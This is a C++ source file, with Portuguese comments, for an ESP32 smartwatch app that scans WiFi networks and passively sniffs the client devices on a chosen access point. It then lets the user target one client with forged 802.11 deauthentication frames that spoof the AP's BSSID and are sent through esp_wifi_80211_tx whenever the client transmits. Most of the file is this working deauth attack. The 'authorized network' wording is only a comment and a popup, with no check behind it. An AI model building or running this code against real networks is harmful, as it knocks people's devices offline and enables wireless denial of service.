/**
 * @file      ui_deauth.cpp
 * @brief     Fluxo de observacao WiFi do leWatch: rede -> dispositivos -> alvo.
 *
 * A descoberta de dispositivos e passiva. O envio de frames de gerenciamento
 * continua separado no ultimo passo e deve ser usado somente em rede autorizada.
 */
#include "ui_define.h"

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#endif

enum deauth_mode_t : uint8_t {
    DEAUTH_MODE_IDLE = 0,
    DEAUTH_MODE_OBSERVE,
    DEAUTH_MODE_SINGLE,
};

#define DEAUTH_FRAMES_PER_HIT 16
#define DEAUTH_MAX_STATIONS   32

static volatile deauth_mode_t s_mode = DEAUTH_MODE_IDLE;
static volatile int s_stations_deauthed = 0;
static volatile uint32_t s_tx_ok = 0;
static volatile uint32_t s_tx_fail = 0;
#ifdef ARDUINO
static volatile esp_err_t s_last_tx_err = ESP_OK;
#endif
static uint16_t s_selected_network = 0;
static uint8_t s_station_macs[DEAUTH_MAX_STATIONS][6];
static int8_t s_station_rssi[DEAUTH_MAX_STATIONS];
static volatile uint8_t s_station_count = 0;

#ifdef ARDUINO
static portMUX_TYPE s_station_lock = portMUX_INITIALIZER_UNLOCKED;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_ctrl;
} mac_hdr_t;

typedef struct {
    uint8_t frame_control[2] = { 0xC0, 0x00 };
    uint8_t duration[2];
    uint8_t station[6];
    uint8_t sender[6];
    uint8_t access_point[6];
    uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
    uint16_t reason;
} deauth_frame_t;

static deauth_frame_t s_frame;
static const wifi_promiscuous_filter_t SNIFF_FILTER = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
};
#endif

static lv_obj_t *s_menu = NULL;
static lv_obj_t *s_network_dd = NULL;
static lv_obj_t *s_device_dd = NULL;
static lv_obj_t *s_reason_dd = NULL;
static lv_obj_t *s_status = NULL;
static lv_obj_t *s_device_status = NULL;
static lv_obj_t *s_devices_page = NULL;
static lv_timer_t *s_status_timer = NULL;
static bool s_scanning = false;
static uint32_t s_scan_started_tick = 0;
static uint8_t s_rendered_station_count = 0;
static std::vector<wifi_scan_params_t> s_scan_list;

static void deauth_attack_stop(void);

static bool mac_is_broadcast(const uint8_t *mac)
{
    static const uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    return memcmp(mac, broadcast, sizeof(broadcast)) == 0;
}

static bool mac_is_usable(const uint8_t *mac)
{
    return !mac_is_broadcast(mac) && (mac[0] & 0x01) == 0;
}

static void observed_stations_clear()
{
#ifdef ARDUINO
    portENTER_CRITICAL(&s_station_lock);
#endif
    s_station_count = 0;
    s_rendered_station_count = 0;
#ifdef ARDUINO
    portEXIT_CRITICAL(&s_station_lock);
#endif
}

static void observed_station_add(const uint8_t *mac, int8_t rssi)
{
    if (!mac_is_usable(mac)) {
        return;
    }
#ifdef ARDUINO
    portENTER_CRITICAL(&s_station_lock);
#endif
    for (uint8_t i = 0; i < s_station_count; i++) {
        if (memcmp(s_station_macs[i], mac, 6) == 0) {
            s_station_rssi[i] = rssi;
#ifdef ARDUINO
            portEXIT_CRITICAL(&s_station_lock);
#endif
            return;
        }
    }
    if (s_station_count < DEAUTH_MAX_STATIONS) {
        memcpy(s_station_macs[s_station_count], mac, 6);
        s_station_rssi[s_station_count++] = rssi;
    }
#ifdef ARDUINO
    portEXIT_CRITICAL(&s_station_lock);
#endif
}

static uint8_t observed_stations_snapshot(uint8_t macs[][6], int8_t *rssis)
{
    uint8_t count;
#ifdef ARDUINO
    portENTER_CRITICAL(&s_station_lock);
#endif
    count = s_station_count;
    for (uint8_t i = 0; i < count; i++) {
        memcpy(macs[i], s_station_macs[i], 6);
        rssis[i] = s_station_rssi[i];
    }
#ifdef ARDUINO
    portEXIT_CRITICAL(&s_station_lock);
#endif
    return count;
}

#ifdef ARDUINO
static void observe_frame(const mac_hdr_t *hdr, int8_t rssi)
{
    const uint8_t *ap = s_frame.sender;
    bool ap_is_source = memcmp(hdr->src, ap, 6) == 0;
    bool ap_is_destination = memcmp(hdr->dest, ap, 6) == 0;
    bool ap_is_bssid = memcmp(hdr->bssid, ap, 6) == 0;

    if (ap_is_source && mac_is_usable(hdr->dest)) {
        observed_station_add(hdr->dest, rssi);
    }
    if (ap_is_destination && mac_is_usable(hdr->src)) {
        observed_station_add(hdr->src, rssi);
    }
    if (ap_is_bssid) {
        if (mac_is_usable(hdr->src) && !ap_is_source) {
            observed_station_add(hdr->src, rssi);
        }
        if (mac_is_usable(hdr->dest) && !ap_is_destination) {
            observed_station_add(hdr->dest, rssi);
        }
    }
}

static void deauth_tx()
{
    for (int i = 0; i < DEAUTH_FRAMES_PER_HIT; i++) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, &s_frame, sizeof(s_frame), false);
        if (err != ESP_OK) {
            s_last_tx_err = err;
            s_tx_fail++;
            return;
        }
        s_tx_ok++;
    }
}

static void attack_selected_frame(const mac_hdr_t *hdr)
{
    bool station_is_source = memcmp(hdr->src, s_frame.station, 6) == 0;
    bool station_is_destination = memcmp(hdr->dest, s_frame.station, 6) == 0;
    bool frame_belongs_to_ap = memcmp(hdr->bssid, s_frame.sender, 6) == 0 ||
                               memcmp(hdr->src, s_frame.sender, 6) == 0 ||
                               memcmp(hdr->dest, s_frame.sender, 6) == 0;
    if ((station_is_source || station_is_destination) && frame_belongs_to_ap) {
        deauth_tx();
        s_stations_deauthed++;
    }
}

static void deauth_sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)type;
    const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
    if ((int)raw->rx_ctrl.sig_len < (int)sizeof(mac_hdr_t)) {
        return;
    }
    const mac_hdr_t *hdr = (mac_hdr_t *)raw->payload;
    if (s_mode == DEAUTH_MODE_OBSERVE) {
        observe_frame(hdr, raw->rx_ctrl.rssi);
    } else if (s_mode == DEAUTH_MODE_SINGLE) {
        attack_selected_frame(hdr);
    }
}

static void deauth_enable_sniffer()
{
    esp_wifi_set_promiscuous_filter(&SNIFF_FILTER);
    esp_wifi_set_promiscuous_rx_cb(deauth_sniffer);
    esp_wifi_set_promiscuous(true);
}
#endif

static bool deauth_observer_start(uint16_t network_index)
{
    if (network_index >= s_scan_list.size()) {
        return false;
    }
    deauth_attack_stop();
    observed_stations_clear();
    s_selected_network = network_index;
#ifdef ARDUINO
    const wifi_scan_params_t &ap = s_scan_list[network_index];
    memcpy(s_frame.sender, ap.bssid, 6);
    memcpy(s_frame.access_point, ap.bssid, 6);
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    s_mode = DEAUTH_MODE_OBSERVE;
    deauth_enable_sniffer();
#else
    LV_UNUSED(network_index);
#endif
    return true;
}

static bool deauth_prepare_selected(uint16_t device_index, uint16_t reason)
{
    if (s_selected_network >= s_scan_list.size()) {
        return false;
    }
    uint8_t macs[DEAUTH_MAX_STATIONS][6];
    int8_t rssis[DEAUTH_MAX_STATIONS];
    uint8_t count = observed_stations_snapshot(macs, rssis);
    if (device_index >= count) {
        return false;
    }
#ifdef ARDUINO
    const wifi_scan_params_t &ap = s_scan_list[s_selected_network];
    memcpy(s_frame.sender, ap.bssid, 6);
    memcpy(s_frame.access_point, ap.bssid, 6);
    memcpy(s_frame.station, macs[device_index], 6);
    s_frame.reason = reason;
    WiFi.softAP("leWatch-deauth", "leWatch123", ap.channel);
#else
    LV_UNUSED(reason);
#endif
    return true;
}

static bool deauth_attack_start(uint16_t device_index, uint16_t reason)
{
    deauth_attack_stop();
    if (!deauth_prepare_selected(device_index, reason)) {
        return false;
    }
#ifdef ARDUINO
    const wifi_scan_params_t &ap = s_scan_list[s_selected_network];
    WiFi.mode(WIFI_MODE_APSTA);
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    s_frame.reason = reason;
    s_mode = DEAUTH_MODE_SINGLE;
    deauth_enable_sniffer();
#else
    LV_UNUSED(reason);
    s_mode = DEAUTH_MODE_SINGLE;
#endif
    s_stations_deauthed = 0;
    return true;
}

static void deauth_attack_stop(void)
{
#ifdef ARDUINO
    esp_wifi_set_promiscuous(false);
#endif
    hw_wifi_off();
    s_mode = DEAUTH_MODE_IDLE;
}

static void kill_vpn_tunnel()
{
#ifdef ARDUINO
    if (hw_vpn_up()) {
        hw_vpn_end();
    }
#endif
}

static lv_obj_t *deauth_action_button(lv_obj_t *page, const char *txt, lv_event_cb_t cb)
{
    lv_obj_t *button = lv_btn_create(page);
    lv_obj_set_width(button, lv_pct(90));
    lv_obj_set_style_text_font(button, &lv_font_montserrat_18, 0);
    lv_obj_add_event_cb(button, cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *label = lv_label_create(button);
    lv_label_set_text(label, txt);
    lv_obj_center(label);
    return button;
}

static void fill_network_dropdown()
{
    hw_get_wifi_scan_result(s_scan_list);
    lv_dropdown_clear_options(s_network_dd);
    for (size_t i = 0; i < s_scan_list.size(); i++) {
        char option[96];
        snprintf(option, sizeof(option), "%s (ch%ld) %ddBm", s_scan_list[i].ssid.c_str(),
                 (long)s_scan_list[i].channel, (int)s_scan_list[i].rssi);
        lv_dropdown_add_option(s_network_dd, option, (uint32_t)i);
    }
    s_selected_network = 0;
    observed_stations_clear();
    if (!s_scan_list.empty()) {
        lv_dropdown_set_selected(s_network_dd, 0);
    }
}

static void scan_anim_step(void *obj, int32_t value)
{
    if (!s_scanning) {
        return;
    }
    lv_obj_t *bar = (lv_obj_t *)obj;
    lv_bar_set_value(bar, value, LV_ANIM_ON);
    uint32_t elapsed = lv_tick_get() - s_scan_started_tick;
    bool finished = elapsed >= 500 && !hw_get_wifi_scanning();
    if ((value >= 100 || finished) && elapsed >= 500) {
        s_scanning = false;
        lv_obj_delete(lv_obj_get_parent(bar));
        fill_network_dropdown();
    }
}

static void scan_btn_event(lv_event_t *e)
{
    (void)e;
    if (s_scanning) {
        return;
    }
    kill_vpn_tunnel();
    deauth_attack_stop();
#ifdef ARDUINO
    WiFi.mode(WIFI_MODE_STA);
#endif
    s_scanning = true;
    s_scan_started_tick = lv_tick_get();
    hw_set_wifi_scan();
    lv_obj_t *bar = ui_create_process_bar(lv_screen_active(), "Varredura WiFi...");
    lv_anim_t animation;
    lv_anim_init(&animation);
    lv_anim_set_exec_cb(&animation, scan_anim_step);
    lv_anim_set_time(&animation, 20000);
    lv_anim_set_var(&animation, bar);
    lv_anim_set_values(&animation, 0, 100);
    lv_anim_start(&animation);
}

static void network_changed_cb(lv_event_t *e)
{
    (void)e;
    s_selected_network = lv_dropdown_get_selected(s_network_dd);
    if (s_mode != DEAUTH_MODE_IDLE) {
        deauth_attack_stop();
    }
    observed_stations_clear();
}

static void fill_device_dropdown()
{
    if (s_device_dd && lv_dropdown_is_open(s_device_dd)) {
        return;
    }
    uint8_t macs[DEAUTH_MAX_STATIONS][6];
    int8_t rssis[DEAUTH_MAX_STATIONS];
    uint8_t count = observed_stations_snapshot(macs, rssis);
    if (count == s_rendered_station_count || !s_device_dd) {
        return;
    }
    lv_dropdown_clear_options(s_device_dd);
    for (uint8_t i = 0; i < count; i++) {
        char option[48];
        snprintf(option, sizeof(option), "%02X:%02X:%02X:%02X:%02X:%02X (%ddBm)",
                 macs[i][0], macs[i][1], macs[i][2], macs[i][3], macs[i][4], macs[i][5],
                 (int)rssis[i]);
        lv_dropdown_add_option(s_device_dd, option, i);
    }
    lv_dropdown_set_selected(s_device_dd, 0);
    s_rendered_station_count = count;
}

static void status_tick(lv_timer_t *t)
{
    (void)t;
    fill_device_dropdown();
    if (s_status) {
        const char *text = s_scan_list.empty() ? "Nenhuma rede" : "Rede selecionada";
        lv_label_set_text(s_status, text);
    }
    if (s_device_status) {
        const char *text = s_mode == DEAUTH_MODE_OBSERVE ? "Observando dispositivos..." :
                           s_mode == DEAUTH_MODE_SINGLE ? "Alvo ativo" : "Observador parado";
        lv_label_set_text_fmt(s_device_status, "%s\nDispositivos: %d\nFrames: %d", text,
                              (int)s_station_count, (int)s_stations_deauthed);
    }
#ifdef ARDUINO
    if (s_mode == DEAUTH_MODE_SINGLE) {
        Serial.printf("[deauth] stations=%d matches=%d tx_ok=%u tx_fail=%u last_err=%s\n",
                      (int)s_station_count, (int)s_stations_deauthed,
                      (unsigned)s_tx_ok, (unsigned)s_tx_fail, esp_err_to_name(s_last_tx_err));
    }
#endif
}

static void observe_btn_event(lv_event_t *e)
{
    (void)e;
    uint16_t network = lv_dropdown_get_selected(s_network_dd);
    if (!deauth_observer_start(network)) {
        ui_msg_pop_up("Observador", "Faca o Scan e escolha uma rede");
        return;
    }
    lv_menu_set_page(s_menu, s_devices_page);
}

static void stop_observer_cb(lv_event_t *e)
{
    (void)e;
    deauth_attack_stop();
    ui_msg_pop_up("Observador", "Observacao parada");
}

static const uint16_t DEAUTH_REASON_CODES[] = { 0, 1, 2, 3, 4, 7, 8 };
#define DEAUTH_REASON_OPTIONS \
    "0 - Nao especificado\n1 - Generico\n2 - Auth invalida\n3 - SAIR\n4 - Inatividade\n7 - Nao associada\n8 - Desassociando"

static uint16_t deauth_reason_from_index(uint16_t index)
{
    if (index >= sizeof(DEAUTH_REASON_CODES) / sizeof(DEAUTH_REASON_CODES[0])) {
        return 0;
    }
    return DEAUTH_REASON_CODES[index];
}

static void attack_device_cb(lv_event_t *e)
{
    (void)e;
    if (s_station_count == 0) {
        ui_msg_pop_up("Deauth", "Nenhum dispositivo observado");
        return;
    }
    uint16_t device = lv_dropdown_get_selected(s_device_dd);
    uint16_t reason = deauth_reason_from_index(lv_dropdown_get_selected(s_reason_dd));
    kill_vpn_tunnel();
    if (deauth_attack_start(device, reason)) {
        ui_msg_pop_up("Deauth", "Alvo selecionado (rede autorizada)");
    } else {
        ui_msg_pop_up("Deauth", "Dispositivo invalido");
    }
}

static void back_event_handler(lv_event_t *e)
{
    lv_obj_t *object = (lv_obj_t *)lv_event_get_target(e);
    if (!lv_menu_back_btn_is_root(s_menu, object)) {
        return;
    }
    deauth_attack_stop();
    if (s_status_timer) {
        lv_timer_delete(s_status_timer);
        s_status_timer = NULL;
    }
    s_status = NULL;
    s_device_status = NULL;
    s_network_dd = NULL;
    s_device_dd = NULL;
    s_reason_dd = NULL;
    lv_obj_clean(s_menu);
    lv_obj_delete(s_menu);
    s_menu = NULL;
    menu_show();
}

static void build_devices_page()
{
    s_devices_page = lv_menu_page_create(s_menu, NULL);
    s_device_dd = create_dropdown(s_devices_page, LV_SYMBOL_WIFI, "Dispositivo", "", 0, NULL);
    s_device_status = create_label(s_devices_page, LV_SYMBOL_LIST, "Status", "Observador parado");
    s_reason_dd = create_dropdown(s_devices_page, LV_SYMBOL_WARNING, "Motivo", DEAUTH_REASON_OPTIONS, 0, NULL);
    deauth_action_button(s_devices_page, LV_SYMBOL_STOP " Parar observador", stop_observer_cb);
    deauth_action_button(s_devices_page, LV_SYMBOL_WARNING " Usar dispositivo", attack_device_cb);
}

void ui_deauth_enter(lv_obj_t *parent)
{
    s_menu = create_menu(parent, back_event_handler);
    lv_obj_t *network_page = lv_menu_page_create(s_menu, NULL);
    deauth_action_button(network_page, LV_SYMBOL_REFRESH " 1. Scan redes", scan_btn_event);
    s_network_dd = create_dropdown(network_page, LV_SYMBOL_WIFI, "Rede", "", 0, network_changed_cb);
    s_status = create_label(network_page, LV_SYMBOL_LIST, "Etapa", "Nenhuma rede");
    deauth_action_button(network_page, LV_SYMBOL_WIFI " 2. Observar dispositivos", observe_btn_event);
    build_devices_page();
    lv_menu_set_page(s_menu, network_page);
    if (!s_status_timer) {
        s_status_timer = lv_timer_create(status_tick, 500, NULL);
    }
}

void ui_deauth_exit(lv_obj_t *parent)
{
    LV_UNUSED(parent);
}

app_t ui_deauth_main = {
    .setup_func_cb = ui_deauth_enter,
    .exit_func_cb = ui_deauth_exit,
    .user_data = nullptr,
};
